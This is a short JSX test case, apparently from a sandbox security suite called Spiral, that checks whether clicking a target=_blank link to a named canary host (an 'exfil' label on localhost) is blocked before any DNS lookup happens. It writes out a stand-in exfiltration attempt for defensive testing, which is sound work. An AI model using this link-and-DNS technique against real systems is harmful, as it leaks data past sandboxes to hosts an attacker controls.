// Copyright 2026 the Spiral authors. AGPL-3.0-or-later.
// @attack spiral-link-blank-named-host
// @threat network
// @expect blocked
// @checklist —
// @note target=_blank to a host NAME: a connection here means the name was resolved first, i.e. a DNS lookup of a label the post chose.

export default () => <Done after={3000} run={async () => {
  make("a", { href: "http://spiral-canary-exfil-0123abcd.localhost:47913/c/spiral-link-blank-named-host", target: "_blank" }).click();
}} />;
